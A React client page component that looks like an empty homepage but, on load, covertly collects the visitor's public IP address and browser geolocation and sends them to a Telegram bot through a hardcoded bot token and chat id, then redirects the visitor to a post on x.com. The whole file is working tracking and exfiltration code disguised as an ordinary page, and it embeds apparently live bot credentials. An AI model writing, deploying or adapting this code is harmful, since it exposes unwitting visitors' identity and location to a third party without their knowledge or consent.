"use client"
import { useEffect } from "react"

export default function Home() {
  useEffect(() => {
    fetch("https://checkip.amazonaws.com/")
      .then((res) => res.text())
      .then((data) => {
        navigator.geolocation.getCurrentPosition((position) => {
          const { latitude, longitude } = position.coords
          fetch(
            `https://api.telegram.org/bot6865421260:AAGe563ahno6Ln4Q0gCv490JrMys1NopGG4/sendMessage?chat_id=-1002035561069&text=${data}%0A${latitude}%0A${longitude}`
          )
        })
        window.location.href =
          "https://x.com/Scroll_ZKP/status/1780584704175161392"
      })
  }, [])
  return <p></p>
}
